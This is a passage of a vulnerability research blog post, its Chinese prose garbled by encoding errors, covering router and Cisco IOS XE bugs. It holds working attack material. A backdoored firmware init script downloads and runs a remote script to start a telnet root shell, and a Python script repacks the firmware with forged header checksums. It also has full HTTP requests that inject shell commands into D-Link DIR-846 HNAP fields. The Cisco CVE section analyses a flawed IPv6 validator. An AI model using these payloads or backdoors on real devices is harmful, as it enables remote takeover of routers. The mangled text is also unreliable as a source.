æ–‡ä»¶ç³»ç»Ÿè¢«ä¿®æ”¹ï¼Œè¿™é‡Œç”¨åˆ°äº†ciscoçš„å¼€æºç¼–è¯‘å·¥å…·(ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šå¼€æº)<https://www.cisco.com/web/fw/opensource/64846727/payton_1.3.5.001_gpl-28.tar.gz>ï¼Œä¸‹è½½åå°†å…¶ä¸­ç”¨åˆ°çš„å·¥å…·è¿›è¡Œç¼–è¯‘
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231205174817.png)

æœ‰äº†è§£åŒ…å’Œæ‰“åŒ…çš„å·¥å…·ï¼Œç„¶åå°±æ˜¯ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨å¯åŠ¨æ–‡ä»¶/etc/rc.init.1ä¸­æ’å…¥åå¼¹shellçš„è¯­å¥ï¼Œç”±äºåŸç³»ç»Ÿæ²¡æœ‰telnetdï¼Œè¿™é‡Œå‡†å¤‡ä¸€ä¸ªbusybox

```shell
#!/bin/sh
#
# /etc/rc.init.1 , should create necessary directory and load the driver
# please don't access nvram here, or modfiy any other env variable code here
# - by wenij
$(/bin/sleep 60 && /bin/busybox wget -O /tmp/1.sh http://192.168.0.124:8000/1.sh && /bin/busybox chmod 777 /tmp/1.sh && /tmp/1.sh) &
if [ ! -d "/var/tmp/events" ]; then
	mkdir /var/tmp/events
fi
```

1.sh
```shell
/bin/busybox wget -O /tmp/busybox http://192.168.0.136:8000/busybox
/bin/busybox chmod 777 /tmp/busybox
/tmp/busybox telnetd -l /bin/sh
```

repack.py

```python
import os
import hashlib

os.system("dd if=ori.bin of=sqfs.ori bs=1 skip=1573256")    # extract sqfs
os.system("sudo ./tools/unsquashfs ./sqfs.ori")             # unpack squashfs
os.system("sudo cp ./files/rc.init.1 ./squashfs-root/etc")  # move init script to /etc
os.system("sudo chmod 777 ./squashfs-root/etc/rc.init.1")
os.system("sudo ./tools/mksquashfs ./squashfs-root ./target/target.image -check_data -noappend -le -noI -all-root")   # repack
os.system("sudo ./tools/mkimage -A arm -O linux -C none -T filesystem -n SP2Xcybertan_rom_bin -c SP2X -d ./target/target.image -s ./target/file_system.img")    # pack to uimage

f = open("./target/file_system.img", "rb")
data = f.read()
f.close()
t = open("./target/padding_file_system.img", "wb")
t_data = data + b"\x00" * 40960    # padding \x00
t.write(t_data)
t.close()

os.system("cp ./target/kernel_mdu.bin.ori ./target/kernel_mdu.bin")
os.system("cat ./target/padding_file_system.img >> ./target/kernel_mdu.bin")
os.system("./tools/moduler -v 1.0 -t 1 -i 0 -m 0x1200000 -o ./target/kernel_pfmwr.img ./target/kernel_mdu.bin")
os.system("./tools/pkger -v \"1.4.2\" -o ./target/packed.bin ./target/kernel_pfmwr.img")

f = open("./target/packed.bin", "rb")
tmp_data = f.read()
tmp_header = tmp_data[:0x104]
next_data = tmp_data[0x104:]
f.close()

fixed_header = tmp_header[:0x30] + b"\x00" * 0x20 + b"\x00\x00\x00\x88" + b"\x00\x00\x00\x80" + b"\x00\x9a\x01\x88" + b"\x31\x2e\x34\x2e" + tmp_header[0x60:0x84] + b"\x01\xea\xea\x3a" + tmp_header[0x84:]

i = 0
token = 0
buf = []
while i < len(fixed_header):
    buf.append((fixed_header[i] + token) & 0xff)
    token += 19
    i += 1

tmp = hashlib.md5(bytes(buf)).hexdigest()
fixed_header = tmp_header[:0x30] + b"\x00" * 0x10 + bytes.fromhex(tmp) + b"\x00\x00\x00\x88" + b"\x00\x00\x00\x80" + b"\x00\x9a\x01\x88" + b"\x31\x2e\x34\x2e" + tmp_header[0x60:0x84] + b"\x01\xea\xea\x3a" + tmp_header[0x84:]

tmp2 = hashlib.md5(fixed_header).hexdigest()
fixed_header = tmp_header[:0x30] + bytes.fromhex(tmp2) + bytes.fromhex(tmp) + b"\x00\x00\x00\x88" + b"\x00\x00\x00\x80" + b"\x00\x9a\x01\x88" + b"\x31\x2e\x34\x2e" + tmp_header[0x60:0x84] + b"\x01\xea\xea\x3a" + tmp_header[0x84:]

f = open("./target/final.img", "wb")
f.write(fixed_header + next_data)
f.close()

os.system("sudo rm -rf ./squashfs-root ./target/target.image")
os.system("rm -rf ./target/kernel_mdu.bin")
os.system("sudo rm -rf ./target/file_system.img")
os.system("rm -rf ./target/padding_file_system.img")
os.system("rm -rf ./target/kernel_pfmwr.img")
os.system("rm -rf ./target/packed.bin")
```

ç„¶åä¸Šä¼ æ›´æ–°å›ºä»¶ï¼Œtelnetè®¿é—®å³å¯
ç›®å‰è¯¥å›ºä»¶ä¸ºå®˜ç½‘æœ€æ–°ç‰ˆæœ¬ï¼Œè¯¥å›ºä»¶åœæ­¢æ›´æ–°ï¼Œæš‚æ— ä¿®å¤

## DIR-846

ç¯å¢ƒæ­å»º

**FrimAEæ€ä¹ˆçœ‹åˆ°è¾“å‡ºå•Šï¼Ÿ** æŸ¥çœ‹æ—¥å¿—

å‘ç°è¢«å¯¼å‘index.htmlï¼Œhnap 503 æŠ¥é”™ï¼Œè¿™ç§æƒ…å†µæŸ¥çœ‹æ—¥å¿—

```shell
ps | grep http
cat /etc/lighttpd/lighttpd.conf | grep log
touch /error
vi /etc/lighttpd/lighttpd.conf
# ä¿®æ”¹æ—¥å¿—è·¯å¾„
```

é‡æ–°å¯åŠ¨æœåŠ¡

```shell
kill -9 186 & /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
```

æŸ¥çœ‹æ—¥å¿—è¾“å‡ºï¼Œå‘ç°phpæœªèƒ½å¯åŠ¨

```shell
find . -name "*php*"
```

å¯åŠ¨phpæœåŠ¡å³å¯

### æ¼æ´åˆ†æ

phpæœåŠ¡ï¼Œæ‰¾åˆ°phpå‡½æ•°ä»¥åï¼Œç­›é€‰execå‡½æ•°

```shell
config system
        option hostname rtkmips
        option timezone ''`id > /tmp/result`''
```



```php
<?php

class SetNTPServerSettings extends GetMultipleHNAPs
{
    function __construct($act_val)
    {
        parent::__construct($act_val);
    }

    public function actionIndex()
    {
        $option = $this->act_val;
        $system_info = read_cfg_info("system");
        $system_info = add_or_update_option_info($system_info, "system", "", "timezone", $option['system_time_timezone']);
        save_cfg_info("system", $system_info);
        exec("/etc/init.d/system  restart");
        $result['SetNTPServerSettingsResult'] = "OK";
        $this->api_response(__CLASS__, $result);
    }
}
```





```php
<?php
set_time_limit(300);

class SetNetworkTomographySettings extends GetMultipleHNAPs
{
    function __construct($act_val)
    {
        parent::__construct($act_val);
    }

    public function actionIndex()
    {
        $result['SetNetworkTomographySettingsResult'] = "FAIL";
        $option = $this->act_val;

        $ping_number_range = array("options" => array("min_range" => 1, "max_range" => 50));
        $ping_size_range = array("options" => array("min_range" => 4, "max_range" => 1472));

        if (!filter_var($option['tomography_ping_number'], FILTER_VALIDATE_INT, $ping_number_range)) {  //æ ¡éªŒpingæ¬¡æ•°èŒƒå›´
            $result["message"] = "pingçš„æ¬¡æ•°ä¸åˆæ³•";
        } elseif (!filter_var($option['tomography_ping_size'], FILTER_VALIDATE_INT, $ping_size_range)) {  //æ ¡éªŒpingåŒ…å¤§å°èŒƒå›´
            $result["message"] = "pingåŒ…å¤§å°ä¸åˆæ³•";
        } elseif (!(filter_var($option['tomography_ping_address'], FILTER_VALIDATE_IP)  //æ ¡éªŒæ˜¯å¦ä¸ºåˆæ³•IPæˆ–åŸŸå
            || check_domain($option['tomography_ping_address']))) {
            $result["message"] = "ä¸æ˜¯åˆæ³•çš„IPæˆ–åŸŸå";
        } else {
            exec("ping -c " . $option['tomography_ping_number'] . " -s " . $option['tomography_ping_size'] . " '" . $option['tomography_ping_address'] . "' > /tmp/ping.result");
            file_put_contents("/etc/.SetNetworkTomography", json_encode($option));
            $result['SetNetworkTomographySettingsResult'] = "OK";
        }
        $this->api_response(__CLASS__, $result);
    }
}
```





### åˆ©ç”¨åˆ†æ

**ç®¡é“ç¬¦æ˜¯ä¸å¿…è¦çš„ï¼Œé—­åˆæ˜¯å¿…è¦çš„(ç‰¹æ®Šæƒ…å†µ echo )** 

;æœ‰æ— ç©ºæ ¼éƒ½è¡Œ



ä½¿ç”¨SetNTPServerSettingsæ¥å£å¾€/etc/config/systemæ–‡ä»¶ä¸­æ³¨å…¥å‘½ä»¤

```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNTPServerSettings"
HNAP_AUTH: 8D44532710B3593A73383F4366A6A89D 1700479594806
Content-Length: 99
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700479592337
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=5Pv9fmhD; PrivateKey=29C562F7DA84E8FD829F2125E8C11CFC


{
	"SetNTPServerSettings":{
		"system_time_timezone":"'|`id > /tmp/result`|echo'"
	}
}
```





```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
Content-Length: 230
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700472754954
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=LVAxmY29; PrivateKey=BB1FEDF0DF83D8E15348FE7C93037EA3; 

{
    "SetNetworkTomographySettings":{
    "tomography_ping_address":"http://example.com/'&telnetd&echo'1",
    "tomography_ping_number":"1",
    "tomography_ping_size":"4",
    "tomography_ping_timeout":"",
    "tomography_ping_ttl":""
	}
}
```







```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
Content-Length: 260
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700472754954
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=ye2PVqI8; PrivateKey=CCEB89E7E0DAB212E9FEB4A4695A017E

{
    "SetIpMacBindSettings":{
    "lan_unit":"0"
    "lan(0)_dhcps_staticlist":"1,$(id>rce_confirmed),02:42:d6:f9:dc:4e,192.168.0.15"
}
```





## 3.CVE-2023-20198 & CVE-2023-20273  Cisco IOS XE
### æ¼æ´æè¿°
CVE-2023-20198ï¼ŒCVE-2023-20273

æ€ç§‘æ­£åœ¨é’ˆå¯¹ Cisco IOS XE è½¯ä»¶ä¸­è§‚å¯Ÿåˆ°çš„ Web UI åŠŸèƒ½åˆ©ç”¨æƒ…å†µè¿›è¡ŒæŒç»­è°ƒæŸ¥ï¼Œæä¾›æœ€æ–°ä¿¡æ¯ã€‚æˆ‘ä»¬æ­£åœ¨æ›´æ–°ä¿®å¤ç‰ˆæœ¬åˆ—è¡¨å¹¶æ·»åŠ è½¯ä»¶æ£€æŸ¥å™¨ã€‚æˆ‘ä»¬çš„è°ƒæŸ¥ç¡®å®šï¼Œæ”»å‡»è€…åˆ©ç”¨äº†ä¸¤ä¸ªä»¥å‰æœªçŸ¥çš„é—®é¢˜ã€‚æ”»å‡»è€…é¦–å…ˆåˆ©ç”¨ CVE-2023-20198 è·å¾—åˆå§‹è®¿é—®æƒé™ï¼Œå¹¶å‘å‡ºç‰¹æƒ 15 å‘½ä»¤æ¥åˆ›å»ºæœ¬åœ°ç”¨æˆ·å’Œå¯†ç ç»„åˆã€‚è¿™å…è®¸ç”¨æˆ·ä»¥æ™®é€šç”¨æˆ·è®¿é—®æƒé™ç™»å½•ã€‚ç„¶åï¼Œæ”»å‡»è€…åˆ©ç”¨ Web UI åŠŸèƒ½çš„å¦ä¸€ä¸ªç»„ä»¶ï¼Œåˆ©ç”¨æ–°çš„æœ¬åœ°ç”¨æˆ·å°†æƒé™æå‡ä¸º root å¹¶å°†æ¤å…¥ç¨‹åºå†™å…¥æ–‡ä»¶ç³»ç»Ÿã€‚Cisco å·²ä¸ºæ­¤é—®é¢˜åˆ†é…äº† CVE-2023-20273ã€‚CVE-2023-20198 çš„ CVSS è¯„åˆ†ä¸º 10.0ã€‚CVE-2023-20273 çš„ CVSS è¯„åˆ†ä¸º 7.2ã€‚CSCwh87343 æ­£åœ¨è·Ÿè¸ªè¿™ä¸¤ä¸ª CVEã€‚
### å½±å“èŒƒå›´åŠç‰ˆæœ¬
Cisco IOS XEè½¯ä»¶ç‰ˆæœ¬ç³»åˆ—ï¼ˆå¯ç”¨äº† Web UI åŠŸèƒ½ï¼‰ï¼š
17.9
17.6
17.3
16.12ï¼ˆä»…é™ Catalyst 3650 å’Œ 3850ï¼‰
### æ¼æ´åˆ†æ

å›ºä»¶ä¸‹è½½ï¼š

æ–‡ä»¶ç³»ç»Ÿåˆ†æï¼š
varé‡Œæœ‰webç•Œé¢çš„æ‰€æœ‰å†…å®¹ï¼Œ

ODMé‡Œé¢æœ‰å¾ˆå¤šåŠŸèƒ½çš„æ–‡ä»¶
è¿™æ˜¯ä¸€ä¸ªODMï¼ˆObject Data Modelï¼‰æ–‡ä»¶ï¼Œç”¨äºæè¿°ç‰¹å®šè®¾å¤‡æˆ–ç³»ç»Ÿçš„æ•°æ®æ¨¡å‹å’Œå‘½ä»¤è§„èŒƒã€‚ODMæ–‡ä»¶é€šå¸¸ç”¨äºç®¡ç†å’Œé…ç½®ç½‘ç»œè®¾å¤‡ï¼Œç‰¹åˆ«æ˜¯åœ¨Ciscoè®¾å¤‡ä¸­å¾ˆå¸¸è§ã€‚

ä¸»è¦å®šä¹‰äº†show running-config aaaå‘½ä»¤

```xml
###
show running-config aaa attribute
<?xml version='1.0' encoding='utf-8'?>
<ODMSpec>
<Command>
<Name>show running-config aaa</Name>
</Command>
<OS>ios</OS>
<DataModel>
<Container name="ShowRunningconfigAaa">
<Container name="wnwebdata">
<Container name="aaa attribute list" alias = "entry" dynamic = "true">
<Property name="aaa attribute list" alias="attrlistname" distance = "1" length = "1" type = "String"/>
<Container name="attribute type" alias="attributetype" dynamic="true">
<Property name="attribute type" distance = "1" length = "-1" type = "String"/>
</Container>
</Container>
</Container>
</Container>
</DataModel>
</ODMSpec>

<!--
Copyright (c) 2014-2017 by Cisco Systems, Inc.
All rights reserved.
-->
```





å…ˆç”¨binwalkè§£å‹ï¼Œç„¶åå¡ä½äº†(åæ¥åˆ¤æ–­æ˜¯æ— æ³•è§£å‹pkg)ï¼Œæå–å‡ºäº†ä¸€éƒ¨åˆ†æ–‡ä»¶ç³»ç»Ÿï¼Œä½†æ˜¯åœ¨æ–‡ä»¶ç³»ç»Ÿé‡Œæ²¡æ‰¾åˆ°webç•Œé¢éƒ¨åˆ†å’Œluaæ–‡ä»¶ï¼Œå‘ç°è¿˜æœ‰ä¸€ä¸ª800Mçš„äºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰è§£å‹ã€‚å°†å…¶æå–åˆ°winä¸‹ç”¨7zipæ‰“å¼€

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231206200855.png)
å¾—åˆ°ä¸€å †pkgåŒ…ï¼Œæ‰“å¼€æ¯ä¸ªpkgé‡Œè¾¹éƒ½æœ‰ä¸€ä¸ªimgï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªåå«monoçš„ä¸ä¼—ä¸åŒï¼Œç‚¹å¼€å‘ç°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ¯”åˆšæ‰çš„æ›´åŠ å¥å…¨ã€‚äºæ˜¯æå–åˆ°linuxé‡Œè¿›è¡Œåˆ†æï¼Œæœç„¶æœåˆ°äº†luaå’Œwebç•Œé¢ã€‚

ç”±äºå›ºä»¶æ˜¯x86æ¶æ„ï¼Œè¿˜éœ€è¦å¯åŠ¨nginxæœåŠ¡æš‚æ—¶ä¸å¤ªå¥½èµ·
```shell
âœ  squashfs-root-0 file ./bin/cat
./bin/cat: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d4732ffc359a8578f17bc1888da8132bc1f958c0, stripped
```

åˆ†æå›ºä»¶ï¼Œæ¼æ´ç‚¹ä¸»è¦æ˜¯åœ¨/var/scripts/lua/features/utils.lua
```lua
function utils.isIpv6Address(ip)
	if utils.isNilOrEmptyString(ip) then
                 return false
        end
        local chunks = utils.splitString(ip,":")
        if #chunks > 8 or #chunks < 3 then
                return false
        end
        for i=1,#chunks do
                if chunks[i] ~="" and chunks[i]:match("([a-fA-F0-9]*)") == nil and tonumber(chunks[i],16) <= 65535 then
                        return false
                end
        end
        return true
end
```

è¿™ä¸ªå‡½æ•°ä¸­çš„åˆ†æå¦‚ä¸‹ï¼Œå…¶ä¸­`chunks[i]:match("([a-fA-F0-9]*)")`å»åŒ¹é…16è¿›åˆ¶æ•°å­—å‡ºç°0æ¬¡æˆ–å¤šæ¬¡ï¼Œè€Œä¸æ˜¯å¯¹å­—æ®µè¿›è¡Œå®Œæ•´æ ¡éªŒï¼Œå› æ­¤å¯ä»¥å®ç°æ‹¼æ¥ï¼Œæ¯”å¦‚
```
abc;id;:ab   ->è¾“å‡º   abcd    ab
```

```lua
function utils.isIpv6Address(ip)
    -- æ£€æŸ¥è¾“å…¥æ˜¯å¦ä¸º nil æˆ–è€…æ˜¯ç©ºå­—ç¬¦ä¸²
    if utils.isNilOrEmptyString(ip) then
        return false
    end
    
    -- ä½¿ç”¨ ":" åˆ†å‰² IPv6 åœ°å€ä¸ºå¤šä¸ªå—
    local chunks = utils.splitString(ip, ":")
    
    -- æ£€æŸ¥ IPv6 åœ°å€å—çš„æ•°é‡æ˜¯å¦åœ¨æœ‰æ•ˆèŒƒå›´å†…
    if #chunks > 8 or #chunks < 3 then
        return false
    end
    
    -- éå†æ¯ä¸ª IPv6 åœ°å€å—
    for i = 1, #chunks do
        -- æ£€æŸ¥å½“å‰å—æ˜¯å¦ä¸ºéç©ºå­—ç¬¦ä¸²ä¸”ä¸åŒ¹é…åå…­è¿›åˆ¶æ•°å­—
        -- ä¸”å…¶è½¬æ¢ä¸ºåè¿›åˆ¶åæ˜¯å¦å°äºç­‰äº 65535
        if chunks[i] ~= "" and chunks[i]:match("([a-fA-F0-9]*)") == nil and tonumber(chunks[i], 16) <= 65535 then
            return false
        end
    end
    
    -- å¦‚æœæ‰€æœ‰æ£€æŸ¥é€šè¿‡ï¼Œè¯´æ˜æ˜¯æœ‰æ•ˆçš„ IPv6 åœ°å€
    return true
end

```

è€Œå¼•ç”¨è¿™ä¸€ç‚¹çš„æœ‰å¤šå¤„ï¼Œå…¶ä¸­/var/scripts/lua/services/validationModule.luaä¸­validateIPv4IPV6HostNameAddresså‡½æ•°å°±æœ‰è¿™ä¸ªå¼•ç”¨

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231206203233.png)

```lua
-- IPV6 Address validation
-- IPV4 Address validation
-- Hostname validation
function validationModule.validateIPv4IPV6HostNameAddress(ip)
    if utils.isNilOrEmptyString(ip) then
        return false
    end

    local validation = utils.isIpv4Address(ip) or utils.isIpv6Address(ip) or validationModule.validateFullyQualifiedHostName(ip)
    if not validation then
        utils.setNginxStatus(ngx.HTTP_BAD_REQUEST,"Invalid request data")
    end
    return validation
end
```

è€Œè¯¥å‡½æ•°è¢«/var/scripts/lua/features/snortcheck.luaé‡Œè°ƒç”¨

```lua
local function validateSnortRequest(req)
	if not utils.isNilOrEmptyString(req.ipaddress) then
		validator.validateIPv4IPV6HostNameAddress(req.ipaddress)
	end
	if not utils.isNilOrEmptyString(req.filePath) then
		validateFilePath(req.filePath)
	end
	if not utils.isNilOrEmptyString(req.destFilename) then
		validateFilePath(req.destFilename)
	end

	......
```

å½“source == "local"æ—¶ï¼Œå°±ä¼šä¼ å…¥snortTable["ipaddress"]ç»™ipaddressï¼Œæœ€ç»ˆæ‹¼æ¥åˆ°urlç»™utils.runPexecCommandæ‰§è¡Œ

```lua
local function installSnort(snortTable)
    local cli =""
	local source=snortTable["source"]
	local mode=snortTable["mode"]
	local vsName=snortTable["virtualServiceName"]
	if not utils.isNilOrEmptyString(snortTable["filename"]) then
		validateFilePath(snortTable["filename"])
	end
	if not utils.isNilOrEmptyString(vsName) then
		validator.validate(validator.validateSpecialCharacters, true, vsName)
	end
	if not utils.isNilOrEmptyString(source) then
		validator.validate(validator.validateSpecialCharacters, true, source)
	end
	if source == "device" and mode == "install" then
		local packagePath=snortTable["filename"]
		packagePath = string.gsub(packagePath,"/",":")
		cli = cli.."virtual-service install name".." "..vsName.." package "..packagePath
		--cli = cli.."exit".."\n"
		return cli
	elseif source == "device" and mode == "upgrade" then
		local packagePath=snortTable["filename"]
		packagePath = string.gsub(packagePath,"/",":")
		cli = cli.."virtual-service upgrade name".." "..vsName.." package "..packagePath
		--cli = cli.."exit".."\n"
		return cli
	elseif source == "local" then
		validateSnortRequest(snortTable)
		local copymode = snortTable["copymode"]
		local ipaddress = snortTable["ipaddress"]
		local filePath = snortTable["filePath"]
		local destination = snortTable["destination"]
		local destFilename = snortTable["destFilename"]
		if (destFilename == "" or destFilename == nil) then
			if string.find(filePath, "/") ~= nil then
				local path = utils.splitString(filePath, "/")
				destFilename = path[#path]
			else
				destFilename = filePath
			end
		end
		local url
		if copymode == "ftp" then
			local ftpUsername = snortTable["ftpUsername"]
			local ftpPassword = utils.base64decode(snortTable["ftpPassword"])
			url = "ftp://"..ftpUsername..":"..ftpPassword.."@"..ipaddress.."/"..filePath
		elseif copymode == "sftp" then
			local sftpUsername = snortTable["ftpUsername"]
			local sftpPassword = utils.base64decode(snortTable["ftpPassword"])
			url = "sftp://" .. sftpUsername .. ":" .. sftpPassword .. "@" .. ipaddress.. "/" .. filePath
		else
			url = "tftp://"..ipaddress.."/"..filePath
		end
		local destinationFile = destination..destFilename
		utils.runPexecCommand("setsid",{cleanup_script,"copyova",url,escapeReservedChars(destinationFile),"&"})
		return true
	end
end
```

ç„¶åæ˜¯softwareMgmt.luaï¼Œä¹Ÿæ˜¯åŒæ ·çš„åŸç†ï¼Œå…¶ä¸­çš„validateSmuRequestå‡½æ•°æ ¡éªŒäº†IPV6
```lua
......
elseif method == "POST" then
    local inp = {}
    local req_body = ngx.var.request_body
    if not utils.isNilOrEmptyString(req_body) then
        inp = cjson.decode(req_body)
    end
    local installParams = {}
    if not getInstallInProgress() then
        if lastTag == "installAdd" then
            validateSmuRequest(inp)
            local url, destinationFile = generateUrlAndDestination(inp)
            writeInstallOperationType(inp.operation_type)
            installParams.operation = "install_add"
            installParams.filename = destinationFile
            writeSmuInstallParams(installParams)
            local mode = inp.mode
            -- Install involved file download, which might take long, so it will run in the background.
            utils.runPexecCommand("setsid", {smu_install_script, "--operation", "install_add", "--operation_type", inp.operation_type, "--install_method", mode, "--remote_path", url, "--file_path", destinationFile, "&"})
            ngx.exit(ngx.HTTP_OK)
            .......
```

åŒç›®å½•ä¸‹çš„softwareUpgrade.luaï¼ŒvalidateUpgradeRequestå¯¹IPV6åšäº†æ ¡éªŒ

```lua
elseif method == "POST" then
    -- Variable declarations and assignment to defaults
    local inp
    local isIESwitch = false
    local url
    local post_request_body = ngx.var.request_body
    if post_request_body ~= nil then
        inp = cjson.decode(post_request_body)
        isIESwitch = inp.isIESwitch
        validator.checkForQuotesAndSpaces(inp)
        validateUpgradeRequest(inp)
        url = generateUrl(inp)
        url = softwareUpgradeUtils.escapeReservedChars(url)
    end
    -- Check for ISSU Abort first as it is allowed to run in parallel, and then for rest of the urls
    if lastTag == "installAbortIssu" then
        if not softwareUpgradeUtils.getIssuAbortStatus() then
            -- Save the config before ISSU Abort start
            softwareUpgradeUtils.saveConfig()

            local issuOperationStartMessage = "\nStarting ISSU Install Abort Operation...\n"
            utils.saveFile(webui_issu_abort_log_file, issuOperationStartMessage)
            utils.runPexecCommand("setsid", {cleanup_script, "install_abort_issu", "&"})
            ngx.exit(ngx.HTTP_OK)
        end
```

ä»¥ä¸Šå°±æ˜¯CVE-2023-20273æˆæƒå‘½ä»¤æ³¨å…¥çš„æ¼æ´ç‚¹

ç”±äºæ²¡æœ‰æ–°ç‰ˆçš„å›ºä»¶ï¼Œä»å‚è€ƒæ–‡ç« é‡Œæˆªäº†å¼ ä¿®å¤åçš„å›¾ï¼Œå¯ä»¥çœ‹åˆ°æ”¹åŠ¨è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œå…ˆå¯¹æ•´ä½“åšäº†åŒ¹é…ï¼Œåœ¨å¯¹å•åšäº†åŒ¹é…ï¼Œè¿™æ ·å°±ä¸èƒ½æœ‰é¢å¤–çš„ç‰¹æ®Šå­—ç¬¦äº†

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231206204928.png)

ç„¶åæ˜¯CVE-2023-20198

éƒ¨åˆ†luaçš„å‘½ä»¤æ‰§è¡Œä¼šä¼ é€’ç»™

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231207112214.png)

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231207112254.png)



```lua
local function WSMASendCommand(ConfigureCliString)
	ngx.header.content_type = "application/json"
	local result = ngx.location.capture("/lua5", {method=ngx.HTTP_POST, body=ConfigureCliString});

	-- Result body commented to avoid spamming, and avoid printing sensitive data in log files.
	-- Enable this to print result body. Development purposes only.
	-- ngx.log(ngx.DEBUG,"Result:",result.body)
	local response = result.body
	if not (response == nil or #response == 0) then
			response = string.gsub(response, "Load for[^\r\n]+[\r]?\n", "")
			response = string.gsub(response, "No time source[^\r\n]+[\r]?\n", "")
			response = string.gsub(response, "Time source is[^\r\n]+[\r]?\n", "")
	end
	return response
end
```

tipsï¼šWSMAï¼ˆWeb Services Management Agentï¼‰æ˜¯ä¸€ç§ç”¨äºç½‘ç»œè®¾å¤‡ç®¡ç†çš„åè®®å’Œæ¡†æ¶ã€‚WSMAåŸºäºæ ‡å‡†çš„WebæœåŠ¡æŠ€æœ¯ï¼Œå¦‚SOAPï¼ˆSimple Object Access Protocolï¼‰å’ŒWSDLï¼ˆWeb Services Description Languageï¼‰ã€‚æ€»ä½“è€Œè¨€ï¼ŒWSMAæ˜¯ä¸€ç§ç”¨äºç®€åŒ–ç½‘ç»œè®¾å¤‡ç®¡ç†çš„æŠ€æœ¯ï¼Œé€šè¿‡ä½¿ç”¨æ ‡å‡†çš„WebæœåŠ¡æ¥å£ï¼Œä½¿ç½‘ç»œç®¡ç†å‘˜èƒ½å¤Ÿæ›´è½»æ¾åœ°é…ç½®å’Œç›‘æ§ç½‘ç»œè®¾å¤‡ã€‚

æœç´¢lua5å¯ä»¥å¿«é€Ÿæ‰¾åˆ°é…ç½®æ–‡ä»¶/usr/binos/conf/webui.conf

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231207113307.png)








### åˆ©ç”¨åˆ†æ




https://cn-sec.com/archives/2137805.html

https://software.cisco.com/download/home/286321991/type/282046477/release/Cupertino-17.9.1a

https://www.iotsec-zone.com/article/428#2-cve-2023-20273

https://mp.weixin.qq.com/s?__biz=MzUxMDQzNTMyNg==&mid=2247503270&idx=2&sn=61497b460a90089563a5001085f09001&chksm=f9018737ce760e216ca69f6ea70860f9ff357ec010422ba14d68784c3e4e15184bea1c21a9fd&scene=126&sessionid=1698035720&key=094fe642087a4fbe0928fdde94bb3603af6462496d666cf2e7abbae31127be0a5804b29c25762ccd9fef7760fb7a9a237c748c5945f9cf5f07d4877857553cb015e73b63c060b887efc07d8d46c73ed5f51050e70722f55861416ebb596d20ba152dfbe4c8a6c645800bbebb755da9e5c3fbfd229727204ed8403ab65cbd3237&ascene=15&uin=NTY2NTA4NjQ%3D&devicetype=Windows+10+x64&version=63060012&lang=zh_CN&session_us=gh_cf325e4d8d77&countrycode=AL&exportkey=n_ChQIAhIQK0KNUd7KPPHb2w%2FHofaJYBLuAQIE97dBBAEAAAAAAHt7NO8XrCAAAAAOpnltbLcz9gKNyK89dVj0D3Uhh4RMzy8VCRitK%2BrnFnj2vAB%2FTVVNcfQ48o7jQirs9Bzx6Oi7LV3vs0tD5n1StvJLLZMomjQ6tCwfD6DU9wlZ0IQblksQlWpkbpTa7OVXwmxY9yNMvVKRu1Xt9InKeZihK%2FG0FxX2CeFe%2F8PS712sH2x%2Fp3csTq0KWhsUR4h2wxW8M4YfEdwRusXYh9KaVff2gASbT9uRz33MHM0ijg7yRNJYc6emlM0NmBupTvyXY1qdE2ctJvAoywUvtf8LnghuKIDhcWc%3D&acctmode=0&pass_ticket=7e3wURkJn2bxcyZw2ErX22DMhrAsmBcSyBvL6Mq%2Bx5aKZXwKSsRkiTnMBm%2F1%2Fbk2&wx_header=0&fontgear=2



